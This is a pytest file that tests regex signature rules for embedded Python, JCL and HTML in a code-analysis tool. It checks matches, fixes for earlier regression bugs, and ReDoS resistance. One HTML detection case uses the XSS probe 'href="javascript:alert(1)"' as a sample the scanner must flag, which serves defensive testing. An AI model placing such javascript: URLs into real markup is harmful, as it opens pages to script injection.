    closures = EP_RULES["closures"]
    assert bitwise.search("mask = flags << 2")
    assert not bitwise.search("cb = lambda pin: pin.value()"), "bitwise_ops false-positived on a lambda"
    assert closures.search("cb = lambda pin: pin.value()")
    assert not closures.search("mask = flags << 2"), "closures false-positived on a bitwise shift"


def test_embedded_python_explicit_casts_vs_pointers_no_overlap():
    """
    Known ambiguity pattern from the issue template: `explicit_casts`
    checks builtin type calls (int(, str(, ...) plus a bare `cast(`;
    `pointers` checks uctypes/machine.mem-specific tokens. No shared
    token between them.
    """
    casts = EP_RULES["explicit_casts"]
    pointers = EP_RULES["pointers"]
    assert casts.search("int(raw_value)")
    assert not casts.search("uctypes.addressof(buf)"), "explicit_casts false-positived on a uctypes call"
    assert pointers.search("uctypes.addressof(buf)")
    assert not pointers.search("int(raw_value)"), "pointers false-positived on a builtin cast"


def test_embedded_python_test_vs_regex_execution_no_collision():
    """
    Known ambiguity pattern from the issue template: embedded_python's
    regex library is `ure` (`ure.compile`/`ure.search`/`ure.match`/
    `ure.sub`), not a `.test(`-style method, so it shares no token with
    `test`'s unittest/pytest/assert/Mock/setUp/tearDown/def-test_
    alternatives.
    """
    test = EP_RULES["test"]
    regex_execution = EP_RULES["regex_execution"]
    assert test.search("def test_login():\n    pass")
    assert not regex_execution.search("def test_login():\n    pass"), (
        "regex_execution false-positived on a pytest-style test function"
    )
    assert regex_execution.search("m = ure.match(r'^boot', line)")
    assert not test.search("m = ure.match(r'^boot', line)"), "test false-positived on a ure.match call"


def test_embedded_python_func_start_vs_macros_no_collision():
    """
    Known ambiguity pattern from the issue template: `macros` maps to
    MicroPython's `const(...)` compile-time macro, which shares no
    `def`/`class` token with `func_start`'s executable-logic anchor.
    """
    func_start = EP_RULES["func_start"]
    macros = EP_RULES["macros"]
    assert macros.search("const(BAUD_RATE = 9600)")
    assert not func_start.search("const(BAUD_RATE = 9600)"), "func_start false-positived on a const() macro"
    assert func_start.search("def read_temp():")
    assert not macros.search("def read_temp():"), "macros false-positived on a function definition"


def test_embedded_python_safety_and_reflection_metaprogramming_intentional_double_classification():
    """
    Ambiguity sweep: `safety` and `reflection_metaprogramming` both list
    `hasattr`/`getattr` and both fire on the same
    `hasattr(sensor, 'read')`/`getattr(sensor, 'read')` call. Confirmed
    genuine, intentional double-classification (present identically in
    python's own already-hardened rules dict, not an embedded_python-only
    accident): a runtime attribute-existence probe is simultaneously a
    defensive validation technique (safety) AND a dynamic/reflective
    attribute access (reflection_metaprogramming) -- both are structurally
    true at once, the same accepted double-classification shape used
    elsewhere in this codebase (e.g. dockerfile's ENV firing both `globals`
    and `state_mutation`).
    """
    safety = EP_RULES["safety"]
    reflection = EP_RULES["reflection_metaprogramming"]

    line = "if hasattr(sensor, 'read'):"
    assert safety.search(line)
    assert reflection.search(line)

    line2 = "value = getattr(sensor, 'read', None)"
    assert safety.search(line2)
    assert reflection.search(line2)


def test_embedded_python_safety_bypasses_and_thread_sleeps_intentional_double_classification():
    """
    Ambiguity sweep: `safety_bypasses` and `thread_sleeps` both fire on
    `time.sleep(...)`. Confirmed genuine, intentional double-classification
    per the source comment on `safety_bypasses` ("blocking the event loop
    -- detrimental in embedded async"): a blocking sleep call is
    simultaneously a resource-management/thread-blocking event
    (thread_sleeps) AND, specifically in an embedded/async context, a
    safety bypass (it can starve a cooperative scheduler) -- both true at
    once, not an accidental duplication.
    """
    safety_bypasses = EP_RULES["safety_bypasses"]
    thread_sleeps = EP_RULES["thread_sleeps"]

    line = "time.sleep(5)"
    assert safety_bypasses.search(line)
    assert thread_sleeps.search(line)


def test_embedded_python_safety_bypasses_bare_except_vs_typed_except():
    """
    A bare `except:` or `except Exception:` swallows errors; a typed
    except does not. Bodies deliberately avoid a bare `pass` statement --
    `pass` is itself one of this rule's own alternatives, which would
    trigger a match for the wrong reason.
    """
    pattern = EP_RULES["safety_bypasses"]
    assert pattern.search("except:\n    log(e)")
    assert pattern.search("except Exception:\n    log(e)")
    assert not pattern.search("except OSError:\n    log(e)"), (
        "safety_bypasses incorrectly flagged a specific, typed except clause"
    )


def test_embedded_python_comprehensions_one_level_nesting():
    """
    Nested-delimiter audit (Rule 11): a comprehension nested one level
    deep inside another comprehension's iterable must still match within
    the {0,500}-bounded window fixed for ReDoS immunity.
    """
    pattern = EP_RULES["comprehensions"]
    assert pattern.search("[x for x in [y for y in range(10)]]")
    assert pattern.search("{k: v for k, v in {a: b for a, b in pairs}.items()}")


# ==============================================================================
# JCL: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #590, part of epic #518)
# ==============================================================================
JCL_RULES = LANGUAGE_DEFINITIONS["jcl"]["rules"]

_JCL_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", "//         IF (STEP1.RC = 0) THEN", "//STEP1   EXEC PGM=IEFBR14"),
    ("structural_boundaries", "//STEPLIB  DD DSN=SYS1.LINKLIB,DISP=SHR", "//STEP1   EXEC PGM=IEFBR14"),
    ("func_start", "//STEP1   EXEC PGM=IEFBR14", "//STEPLIB  DD DSN=SYS1.LINKLIB,DISP=SHR"),
    ("class_start", "//MYJOB   JOB (ACCT),'PROGRAMMER'", "//STEP1   EXEC PGM=IEFBR14"),
    ("high_risk_execution", "//STEP1   EXEC PGM=IEFBR14", "//STEPLIB  DD DSN=SYS1.LINKLIB,DISP=SHR"),
    ("io", "//SYSPRINT DD SYSOUT=*", "//STEP1   EXEC PGM=IEFBR14"),
    ("state_mutation", "//         SET SYMVAR=VALUE", "//STEP1   EXEC PGM=IEFBR14"),
    ("import", "//         INCLUDE MEMBER=STDPROC1", "//STEP1   EXEC PGM=IEFBR14"),
    ("ownership", "//*Author: Jane Doe", "//* just a routine comment"),
]


@pytest.mark.parametrize("signature,positive,negative", _JCL_SIMPLE_CASES)
def test_jcl_signature_positive_and_negative(signature, positive, negative):
    pattern = JCL_RULES[signature]
    assert pattern is not None, f"jcl's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"jcl {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), f"jcl {signature!r} incorrectly matched an excluded case: {negative!r}"


def test_jcl_func_start_and_class_start_capture_names():
    func_start = JCL_RULES["func_start"]
    m = func_start.search("//STEP1   EXEC PGM=IEFBR14")
    assert m and m.group(1) == "STEP1"

    class_start = JCL_RULES["class_start"]
    m2 = class_start.search("//MYJOB   JOB (ACCT),'PROGRAMMER'")
    assert m2 and m2.group(1) == "MYJOB"


def test_jcl_dependency_capture_extracts_include_member():
    """
    `_dependency_capture` was missing entirely for jcl despite `import` being
    non-None -- unlike nearly every other language in the registry with a
    non-None `import`, jcl's dependency graph never captured which member a
    job/proc pulls in via INCLUDE. Added to fix that gap; covers both the
    named and (more common) unnamed INCLUDE statement forms.
    """
    pattern = JCL_RULES["_dependency_capture"]
    assert pattern is not None, "jcl's _dependency_capture should no longer be missing"
    m = pattern.search("//         INCLUDE MEMBER=STDPROC1")
    assert m and m.group(1) == "STDPROC1"
    m2 = pattern.search("//INCMEM   INCLUDE MEMBER=COMMLIB1")
    assert m2 and m2.group(1) == "COMMLIB1"


def test_jcl_structural_boundaries_unnamed_dd_regression():
    """
    Regression test for a real bug: the name segment between `//` and the
    statement keyword was required (`+`), missing the very common unnamed
    continuation-DD form (`//         DD DSN=...`, concatenating a dataset
    onto the preceding DD with no ddname of its own) -- a routine, everyday
    JCL idiom (e.g. STEPLIB concatenation across multiple load libraries),
    not a synthetic edge case.
    """
    old_pattern = re.compile(r"^[ \t]*//[A-Za-z0-9_#$@]+[ \t]+(?:DD|INCLUDE|SET|PROC|PEND)\b", re.M | re.I)
    unnamed = "//         DD DSN=USER.LOADLIB,DISP=SHR"
    assert not old_pattern.search(unnamed), "sanity check: bug must reproduce against the old pattern"

    pattern = JCL_RULES["structural_boundaries"]
    assert pattern.search(unnamed), "unnamed continuation-DD form still didn't match"
    assert pattern.search("//STEPLIB  DD DSN=SYS1.LINKLIB,DISP=SHR"), "named DD form regressed"
    assert pattern.search("//MYPROC   PROC"), "PROC form regressed"


def test_jcl_import_unnamed_include_regression():
    """
    Regression test for a real bug: same shape as structural_boundaries'
    unnamed-DD gap above -- INCLUDE statements, like DD, are commonly
    written unnamed.
    """
    old_pattern = re.compile(r"^[ \t]*//[A-Za-z0-9_#$@]+[ \t]+INCLUDE\b", re.M | re.I)
    unnamed = "//         INCLUDE MEMBER=STDPROC1"
    assert not old_pattern.search(unnamed), "sanity check: bug must reproduce against the old pattern"

    pattern = JCL_RULES["import"]
    assert pattern.search(unnamed), "unnamed INCLUDE form still didn't match"
    assert pattern.search("//INCMEM   INCLUDE MEMBER=COMMLIB1"), "named INCLUDE form regressed"


def test_jcl_state_mutation_anchored_no_false_positive_regression():
    """
    Regression test for a real bug: `state_mutation` was completely
    unanchored (`\\bSET\\s+NAME=`), matching "SET" anywhere in the scanned
    text -- including inline SYSIN card data (`//SYSIN DD *` ... `/*`),
    which is arbitrary payload data, not a JCL statement at all. A embedded
    SQL/shell/config payload containing "SET X=1" would be misattributed to
    jcl's own state mutation. Anchored to a real `//name SET var=value`
    statement line, mirroring structural_boundaries' own SET handling.
    """
    old_pattern = re.compile(r"\bSET\s+[A-Za-z0-9_#$@]+=", re.I)
    inline_sysin_data = "SET X=1;"
    assert old_pattern.search(inline_sysin_data), "sanity check: bug must reproduce against the old pattern"

    pattern = JCL_RULES["state_mutation"]
    assert not pattern.search(inline_sysin_data), "inline SYSIN data still incorrectly matched"
    assert pattern.search("//         SET SYMVAR=VALUE"), "real SET statement form regressed"
    assert pattern.search("//SETVAR   SET SYMVAR=VALUE"), "named SET statement form regressed"


def test_jcl_cross_line_false_match_regression():
    """
    Regression test for a real, shared bug across five rules
    (structural_boundaries, func_start, class_start, import, state_mutation,
    ownership): the gap between the name segment and the statement keyword
    (or, for ownership, between the label and its value) used `\\s+`, which
    includes `\\n` under `re.M`. Confirmed this lets a name on one physical
    line falsely bind to a keyword starting an *entirely different* line
    that has no `//` prefix of its own -- JCL statements never span a
    physical line via bare whitespace (only via explicit continuation
    columns, which this engine doesn't need to model since the "practical
    reality" per Rule 1 is that continued PARAMETER lists, not the
    name+keyword pair itself, are what wraps). Bounded to `[ \\t]+`.
    """
    old_func_start = re.compile(r"^[ \t]*//([A-Za-z0-9_#$@]+)\s+EXEC\b", re.M | re.I)
    old_class_start = re.compile(r"^[ \t]*//([A-Za-z0-9_#$@]+)\s+JOB\b", re.M | re.I)
    old_ownership = re.compile(r"^//\*\s*(?:Author|Created by|Maintainer):\s+(.*)", re.I | re.M)

    cross_line_step = "//STEP01\nEXEC PGM=FOO\n"
    m = old_func_start.search(cross_line_step)
    assert m and m.group(1) == "STEP01", "sanity check: bug must reproduce against the old func_start pattern"

    cross_line_job = "//MYJOB\nJOB (ACCT)\n"
    m2 = old_class_start.search(cross_line_job)
    assert m2 and m2.group(1) == "MYJOB", "sanity check: bug must reproduce against the old class_start pattern"

    cross_line_author = "//*Author:\n//*Jane Doe\n"
    m3 = old_ownership.search(cross_line_author)
    assert m3 and m3.group(1) == "//*Jane Doe", "sanity check: bug must reproduce against the old ownership pattern"

    assert not JCL_RULES["func_start"].search(cross_line_step), "cross-line func_start false match still occurs"
    assert not JCL_RULES["class_start"].search(cross_line_job), "cross-line class_start false match still occurs"
    assert not JCL_RULES["ownership"].search(cross_line_author), "cross-line ownership false match still occurs"
    assert not JCL_RULES["structural_boundaries"].search("//STEPLIB\nDD DSN=X\n"), (
        "cross-line structural_boundaries false match still occurs"
    )

    # real same-line forms must still work after the fix
    assert JCL_RULES["func_start"].search("//STEP01  EXEC PGM=IEFBR14")
    assert JCL_RULES["class_start"].search("//MYJOB   JOB (ACCT)")
    assert JCL_RULES["ownership"].search("//*Author: Jane Doe").group(1) == "Jane Doe"


def test_jcl_lexical_family_no_block_terminator_state_to_confuse():
    """
    Lexical-family audit: jcl is `line_exclusive` -- no block comment
    delimiters at all, so no rule tracks open/close block-comment state.
    Every keyword-presence rule matches via flat line-anchored scanning.
    JCL's own `//*` comment marker only ever appears as a whole-line
    prefix, so there's no stray closing-tag shape for the engine to be
    fooled by in the first place.
    """
    branch = JCL_RULES["branch"]
    assert branch.search("//         IF (STEP1.RC = 0) THEN")
    assert branch.search("//         ENDIF")


def test_jcl_redos_immunity():
    """
    ReDoS immunity sweep. Every jcl rule has at most one quantified segment
    per adjacent gap, with non-overlapping character classes between
    consecutive quantifiers (name-charset vs. `[ \\t]+` whitespace vs. the
    literal keyword), so none of them have the adjacent-overlapping-
    quantifier shape that produces real O(n^2) backtracking. Verified via
    assert_redos_immune's subprocess-kill timeout on adversarial payloads
    sized to each rule's actual quantifiers (a long run of name-charset
    characters, or digits/letters, with no legitimate terminator).
    """
    assert_redos_immune(JCL_RULES["branch"], "IF " * 20000, timeout_sec=3.0)
    assert_redos_immune(JCL_RULES["structural_boundaries"], "//" + "A" * 50000, timeout_sec=3.0)
    assert_redos_immune(JCL_RULES["func_start"], "//" + "A" * 50000, timeout_sec=3.0)
    assert_redos_immune(JCL_RULES["class_start"], "//" + "A" * 50000, timeout_sec=3.0)
    assert_redos_immune(JCL_RULES["high_risk_execution"], "PGM=" + "A" * 50000, timeout_sec=3.0)
    assert_redos_immune(JCL_RULES["io"], "DISP=" + "A" * 50000, timeout_sec=3.0)
    assert_redos_immune(JCL_RULES["state_mutation"], "//" + "A" * 50000, timeout_sec=3.0)
    assert_redos_immune(JCL_RULES["import"], "//" + "A" * 50000, timeout_sec=3.0)
    assert_redos_immune(JCL_RULES["_dependency_capture"], "//" + "A" * 50000, timeout_sec=3.0)
    assert_redos_immune(JCL_RULES["ownership"], "//*Author:" + "a" * 100000, timeout_sec=3.0)

    # sanity: all still match their real positive cases after the sweep
    assert JCL_RULES["branch"].search("//         IF (STEP1.RC = 0) THEN")
    assert JCL_RULES["structural_boundaries"].search("//STEPLIB  DD DSN=SYS1.LINKLIB,DISP=SHR")


# ==============================================================================
# HTML: STRICT STRUCTURAL SIGNATURE COVERAGE (Issue #587, part of epic #518)
# ==============================================================================
# NOTE: html is currently tagged `lexical_family: "line_exclusive"`, which is
# wrong (it should be `block_exclusive`) -- filed separately as issue #733,
# not fixed here. Confirmed empirically that <!-- --> comments are NEVER
# stripped from code_stream for html today; the whole raw file (comments
# included) is what every rule below actually scans in a real run. Tests here
# are written against that real behavior, not an idealized stripped-comment
# one -- e.g. dead_code/macros search for the literal "<!--" prefix directly,
# which only works because comments survive unstripped.
HTML_RULES = LANGUAGE_DEFINITIONS["html"]["rules"]

_HTML_SIMPLE_CASES = [
    # (signature, positive snippet, text expected to NOT match / None to skip)
    ("branch", '<div v-if="cond">', '<div class="x">'),
    ("args", '<input data-foo="bar">', '<input type="text">'),
    ("structural_boundaries", "<div>", "<not-a-real-boundary-tag>"),
    ("func_start", "<script>", "<div>"),
    ("class_start", "<form>", "<div>"),
    ("safety", "<input required>", '<input type="text">'),
    ("safety_bypasses", 'href="javascript:alert(1)"', 'href="https://example.com"'),
    ("io", 'src="app.js"', "<div>plain text</div>"),
    ("api", 'id="main"', "<div>"),
    ("dead_code", '<!-- <div class="old"></div> -->', "<div>live content</div>"),
    ("doc", "<title>Page Title</title>", "<div>Page Title</div>"),
    ("test", 'data-testid="submit-btn"', 'id="submit-btn"'),
    ("concurrency", "<script async>", "<script>"),
    ("ui_framework", "<strong>bold</strong>", "<div>plain</div>"),
    ("closures", '<template shadowrootmode="open">', "<template>"),
    ("decorators", "<div hidden>", "<div>"),
    ("generics", "<slot></slot>", "<div></div>"),
    ("comprehensions", 'v-for="item in items"', "<div>"),
    ("scientific", "<svg></svg>", "<div></div>"),
    ("reflection_metaprogramming", 'onclick="doThing()"', "<div>"),
    ("import", '<script type="module">', "<script>"),
    ("ownership", '<meta name="author" content="Jane Doe">', '<meta name="viewport">'),
    ("planned_debt", "<!-- TODO: fix this -->", "<!-- done -->"),
    ("fragile_debt", "<!-- HACK: workaround -->", "<!-- clean -->"),
    ("spec_exposure", "<!-- [SPEC-123] compliance tag -->", "<!-- just a note -->"),
    ("ssr_boundaries", "<%= value %>", "<div></div>"),
    ("events", 'hx-trigger="click"', "<div></div>"),
    ("dependency_injection", '<script type="importmap">', "<script>"),
    ("macros", '<!--#include file="header.html" -->', "<!-- regular comment -->"),
    ("telemetry", '<script src="https://www.google-analytics.com/analytics.js">', '<script src="app.js">'),
    ("debug_prints", "console.log('debug')", "logger.info('ok')"),
    ("panics_and_aborts", "window.close()", "window.open()"),
    ("thread_sleeps", "setTimeout(fn, 1000)", "requestAnimationFrame(fn)"),
    ("immutability_locks", "<input readonly>", "<input>"),
    ("cleanup", "clearTimeout(t)", "setTimeout(fn, 0)"),
    ("encapsulation", "<template></template>", "<div></div>"),
    ("listeners", "addEventListener('click', fn)", "<div>no listener here</div>"),
    ("test_skip", "data-skip", "data-run"),
]


@pytest.mark.parametrize("signature,positive,negative", _HTML_SIMPLE_CASES)
def test_html_signature_positive_and_negative(signature, positive, negative):
    pattern = HTML_RULES[signature]
    assert pattern is not None, f"html's {signature!r} rule is unexpectedly None"
    assert pattern.search(positive), f"html {signature!r} failed to match its own documented positive case"
    if negative is not None:
        assert not pattern.search(negative), f"html {signature!r} incorrectly matched an excluded case: {negative!r}"


def test_html_dependency_capture_extracts_src_and_href():
    pattern = HTML_RULES["_dependency_capture"]
    m = pattern.search('<script src="app.js"></script>')
    assert m and m.group(1) == "app.js"
    m2 = pattern.search('<link href="styles.css">')
    assert m2 and m2.group(1) == "styles.css"


def test_html_func_start_and_class_start_no_capture_group_expected():
    # func_start/class_start don't capture a name in html (unlike many
    # languages) -- they anchor on the tag keyword itself. Confirm the match
    # span is the tag, and that they don't collide with each other.
    func_start = HTML_RULES["func_start"]
    class_start = HTML_RULES["class_start"]
    assert func_start.search("<script>")
    assert not class_start.search("<script>"), "func_start's <script>/<style> incorrectly matched by class_start"
    assert class_start.search("<form>")
    assert not func_start.search("<form>"), "class_start's tags incorrectly matched by func_start"


def test_html_star_ngif_leading_boundary_regression():
    """
    Regression test for a real bug: `branch`'s `*ngIf` (Angular's structural
    directive) was inside the shared `\\b(...)"[^"]*"` group. `*` is a
    non-word character always preceded by whitespace in real markup
    (`<div *ngIf="cond">`) -- a `\\b` between two non-word characters can
    never fire, so `*ngIf` never matched at all. Same shape confirmed
    separately for `comprehensions`' `*ngFor` below.
    """
    old_pattern = re.compile(
        r'<(?:details|summary|noscript)\b|\b(?:v-if|ng-if|\*ngIf|x-if|hx-swap)="[^"]*"'
        r"|\{%\s*(?:if|elif|else|endif)\s*[^%]*%\}|\{\{#if\s+[^}]+\}\}",
        re.I,
    )
    realistic = '<div *ngIf="cond">'
    assert not old_pattern.search(realistic), "sanity check: bug must reproduce against the old pattern"

    branch = HTML_RULES["branch"]
    assert branch.search(realistic), "*ngIf still didn't match"
    assert branch.search('<div v-if="cond">'), "v-if form regressed"


def test_html_star_ngfor_leading_boundary_regression():
    old_pattern = re.compile(
        r'\b(?:v-for|ng-repeat|\*ngFor|x-for)="[^"]*"|\{%\s*for\b[^%]*%\}|\{\{#each\b[^}]*\}\}',
        re.I,
    )
    realistic = '<li *ngFor="let item of items">'
    assert not old_pattern.search(realistic), "sanity check: bug must reproduce against the old pattern"

    comprehensions = HTML_RULES["comprehensions"]
    assert comprehensions.search(realistic), "*ngFor still didn't match"
    assert comprehensions.search('<li v-for="item in items">'), "v-for form regressed"


def test_html_safety_quoted_attribute_trailing_boundary_regression():
    """
    Regression test for a real bug: `pattern="..."`, `sandbox="..."`,
    `rel="noopener..."`, and `integrity="..."` were all inside the shared
    `\\b(...)\\b` group. Each ends on a literal `"`, and the character
    immediately following a closing attribute quote (space or `>`) is also
    non-word -- `\\b` between two non-word characters can never fire, so
    none of the four quote-terminated alternatives ever matched; only the
    bare-word alternatives (required/readonly/disabled) worked.
    """
    old_pattern = re.compile(
        r'\b(?:required|readonly|disabled|pattern="[^"]*"|sandbox="[^"]*"|rel="noopener(?: noreferrer)?"'
        r'|integrity="[^"]*")\b|<meta\s+http-equiv="Content-Security-Policy"',
        re.I,
    )
    for snippet in (
        '<input pattern="[0-9]+">',
        '<iframe sandbox="allow-scripts">',
        '<a rel="noopener">',
        '<script integrity="sha384-abc">',
    ):
        assert not old_pattern.search(snippet), f"sanity check: bug must reproduce for {snippet!r}"

    safety = HTML_RULES["safety"]
    assert safety.search('<input pattern="[0-9]+">'), "pattern=... still didn't match"
    assert safety.search('<iframe sandbox="allow-scripts">'), "sandbox=... still didn't match"
    assert safety.search('<a rel="noopener">'), "rel=noopener still didn't match"
    assert safety.search('<a rel="noopener noreferrer">'), "rel=noopener noreferrer still didn't match"
    assert safety.search('<script integrity="sha384-abc">'), "integrity=... still didn't match"
    assert safety.search("<input required>"), "bare-word required regressed"
    assert not safety.search('<input type="text">'), "unrelated attribute incorrectly matched"


def test_html_concurrency_quoted_attribute_trailing_boundary_regression():
    """
    Same shared-`\\b`-after-quote trap as safety, in `concurrency`.
    `decoding="async"` happened to still match under the old pattern (a
    coincidental self-heal: "async" is also a standalone earlier
    alternative, and it appears as the *value* of decoding= too) -- but
    `loading="lazy"` and `fetchpriority="high"/"low"` have no such rescue and
    never matched at all.
    """
    old_pattern = re.compile(
        r'\b(?:async|defer|loading="lazy"|fetchpriority="(?:high|low)"|decoding="async")\b'
        r'|<link\s+rel="(?:preload|prefetch|preconnect|modulepreload|prerender)"',
        re.I,
    )
    assert not old_pattern.search('<img loading="lazy">'), "sanity check: bug must reproduce for loading=lazy"
    assert not old_pattern.search('<img fetchpriority="high">'), "sanity check: bug must reproduce for fetchpriority"
    assert old_pattern.search('<img decoding="async">'), "sanity check: decoding=async self-heals on old pattern too"

    concurrency = HTML_RULES["concurrency"]
    assert concurrency.search('<img loading="lazy">'), "loading=lazy still didn't match"
    assert concurrency.search('<img fetchpriority="high">'), "fetchpriority=high still didn't match"
    assert concurrency.search('<img fetchpriority="low">'), "fetchpriority=low still didn't match"
    assert concurrency.search("<script async>"), "bare-word async regressed"
    assert concurrency.search("<script defer>"), "bare-word defer regressed"


def test_html_decorators_bare_boolean_attribute_regression():
    """
    Regression test for a real bug: `hidden`/`inert` are true HTML boolean
    attributes, almost always written bare (`<div hidden>`) with no `=` at
    all -- the old pattern required `[ \\t]*=` unconditionally after every
    alternative in the group, so the dominant real-world bare form of these
    two never matched (only `hidden=""`/`hidden="until-found"` would have).
    Found while writing this test's own positive case, not pre-derived.
    """
    old_pattern = re.compile(
        r"\b(?:class|style|hidden|inert|tabindex|draggable|spellcheck|dir|lang|translate)[ \t]*="
        r'|hx-[a-z-]+="[^"]*"|x-[a-z-]+="[^"]*"|v-[a-z-]+="[^"]*"',
        re.I,
    )
    assert not old_pattern.search("<div hidden>"), "sanity check: bug must reproduce for bare hidden"
    assert not old_pattern.search("<div inert>"), "sanity check: bug must reproduce for bare inert"

    decorators = HTML_RULES["decorators"]
    assert decorators.search("<div hidden>"), "bare hidden still didn't match"
    assert decorators.search("<div inert>"), "bare inert still didn't match"
    assert decorators.search('<div hidden="until-found">'), "explicit-value hidden form regressed"
    assert decorators.search('<div class="x">'), "class=... (always requires a value) regressed"
    assert not decorators.search("<div class>"), (
        "bare class with no value incorrectly matched -- class always requires an explicit value in real markup"
    )


def test_html_dependency_injection_trailing_boundary_regression():
    """
    Regression test for a real bug: `<script\\s+type="importmap"\\b` had a
    trailing `\\b` right after the closing `"`. The character following a
    closing attribute quote (space or `>`) is non-word, same as `"` itself
    -- `\\b` between two non-word characters can never fire, so this rule
    never matched at all, regardless of input.
    """
    old_pattern = re.compile(r'<script\s+type="importmap"\b', re.I)
    assert not old_pattern.search('<script type="importmap">'), "sanity check: bug must reproduce"
    assert not old_pattern.search('<script type="importmap" src="x">'), "sanity check: bug must reproduce"

    dependency_injection = HTML_RULES["dependency_injection"]
    assert dependency_injection.search('<script type="importmap">'), "closing > form still didn't match"
    assert dependency_injection.search('<script type="importmap" src="x">'), (
        "trailing-attribute form still didn't match"
    )


def test_html_reflection_metaprogramming_style_semicolon_regression():
    """
    Regression test for a real bug: `style="[^"]*;"` required a literal
    trailing semicolon immediately before the closing quote. CSS allows
    omitting the last declaration's semicolon, and most real inline styles
    don't carry one -- neither a single declaration nor a multi-declaration
    style with no trailing `;` matched under the old pattern.
    """
    old_pattern = re.compile(r'style="[^"]*;"|\bon[a-z]+="[^"]*"', re.I)
    assert not old_pattern.search('<div style="color:red">'), "sanity check: bug must reproduce (no trailing ;)"
    assert not old_pattern.search('<div style="color:red;font-size:12px">'), (
        "sanity check: bug must reproduce (multi-declaration, no trailing ;)"
    )
    assert old_pattern.search('<div style="color:red;">'), "sanity check: trailing-; form already worked"

    reflection = HTML_RULES["reflection_metaprogramming"]
    assert reflection.search('<div style="color:red">'), "no-trailing-semicolon style still didn't match"
    assert reflection.search('<div style="color:red;font-size:12px">'), (
        "multi-declaration no-trailing-semicolon style still didn't match"
    )
    assert reflection.search('<div style="color:red;">'), "trailing-semicolon form regressed"
    assert reflection.search('<div onclick="doThing()">'), "on* event handler form regressed"


def test_html_immutability_locks_aria_disabled_trailing_boundary_regression():
    """
    Same shared-`\\b`-after-quote trap as safety/concurrency, in
    `immutability_locks`. `aria-disabled="true"` happened to still match
    under the old pattern via an accidental self-heal ("disabled" is a
    substring of "aria-disabled", and the bare `disabled` alternative's own
    `\\b` fires correctly on that embedded substring) -- meaning it matched
    regardless of whether the value was "true" or "false", which was never
    the intent. Pulled the alternative out so the match is for the right
    reason and confirm it still fires.
    """
    old_pattern = re.compile(r'\b(?:readonly|disabled|inert|aria-disabled="true")\b', re.I)
    assert old_pattern.search('<button aria-disabled="true">'), (
        "sanity check: old pattern self-heals via the embedded 'disabled' substring"
    )

    immutability_locks = HTML_RULES["immutability_locks"]
    assert immutability_locks.search('<button aria-disabled="true">'), "aria-disabled=true still didn't match"
    assert immutability_locks.search("<input readonly>"), "bare-word readonly regressed"


def test_html_func_start_vs_macros_no_false_collision():
    """
    Known ambiguity pattern from the issue template (a run of macro/
    preprocessor-shaped lines fooling func_start, as seen in C++). html's
    func_start is scoped to `<script`/`<style` tags only; macros maps to
    SSI directive comments (`<!--#include ...-->`) -- structurally distinct
    token shapes (`<script`/`<style` vs `<!--#`), no realistic overlap.
    """
    func_start = HTML_RULES["func_start"]
    macros = HTML_RULES["macros"]

    ssi_directive = '<!--#include file="header.html" -->'
    assert macros.search(ssi_directive)
    assert not func_start.search(ssi_directive)

    script_tag = "<script>"
    assert func_start.search(script_tag)
    assert not macros.search(script_tag)


def test_html_func_start_vs_generics_no_false_collision():
    """
    Known ambiguity pattern from the issue template (deeply nested generic
    return types triggering catastrophic backtracking against func_start,
    as seen in C#). html's generics maps to `<slot>` tags; func_start maps
    to `<script`/`<style` -- distinct tag names, no overlap, and neither
    pattern has adjacent unbounded quantifiers for a nested-slot payload to
    exploit.
    """
    func_start = HTML_RULES["func_start"]
    generics = HTML_RULES["generics"]

    slot_tag = '<slot name="header"></slot>'
    assert generics.search(slot_tag)
    assert not func_start.search(slot_tag)

    assert_redos_immune(generics, "<slot " + 'a="b" ' * 20000, timeout_sec=3.0)


def test_html_dead_code_and_macros_rely_on_unstripped_comments():
    """
    Documents the interaction with issue #733 (html's lexical_family is
    mistagged, so <!-- --> comments are never actually stripped from
    code_stream -- confirmed via direct Prism.split_streams() execution).
    dead_code and macros both search for the literal "<!--" prefix directly
    against raw text, which is why they still function correctly today
    despite that pipeline bug -- they were evidently authored already
    assuming comments survive unstripped, not against an idealized
    stripped-comment code_stream. This test exists to make that dependency
    explicit rather than leaving it implicit.
    """
    dead_code = HTML_RULES["dead_code"]
    assert dead_code.search('<!-- <div class="old-widget"></div> -->')
    assert dead_code.search("<!--<script>legacy()</script>-->")
    assert not dead_code.search("<div>this is live, uncommented code</div>")

    macros = HTML_RULES["macros"]
    assert macros.search('<!--#include file="header.html" -->')
    assert not macros.search("<!-- a normal, non-SSI comment -->")


def test_html_lexical_family_no_block_terminator_state_to_confuse():
    """
    Lexical-family audit (Rule per how_to_add_a_language.md): none of
    html's rules track open/close comment-block state themselves -- every
    keyword-presence rule matches via flat scanning. Confirms a stray
    closing `-->` with no matching opener doesn't fool any rule into a
    false structural match.
    """
    branch = HTML_RULES["branch"]
    stray_close = 'some text --> <div v-if="cond">'
    assert branch.search(stray_close), "branch should still see v-if regardless of the stray --> before it"


def test_html_redos_immunity_sweep():
    """
    ReDoS immunity sweep across html's unbounded-quantifier rules (mostly
    `[^"]*"`-delimited attribute values, each a single quantifier bounded
    by its own closing delimiter with no adjacent overlapping-charset
    quantifier to backtrack against). Verified via a systematic scaling
    sweep before writing this test (payload shapes: unterminated quotes,
    parens, angle brackets, template braces, hyphen-chains, dotted calls,
    at n=2000/8000/32000) -- nothing in html's rules exceeded 0.5s at
    n=32000 against any shape, confirming linear behavior throughout. This
    test locks that in with assert_redos_immune's subprocess-kill timeout.
    """
    assert_redos_immune(HTML_RULES["args"], '<input data-foo="' + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(HTML_RULES["safety"], '<input pattern="' + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(HTML_RULES["io"], 'src="' + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(HTML_RULES["api"], 'id="' + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(HTML_RULES["ui_framework"], 'class="' + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(HTML_RULES["decorators"], 'hx-foo="' + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(HTML_RULES["comprehensions"], "{% for " + "a" * 100000, timeout_sec=3.0)
    assert_redos_immune(HTML_RULES["scientific"], 'd="' + "M" * 100000, timeout_sec=3.0)
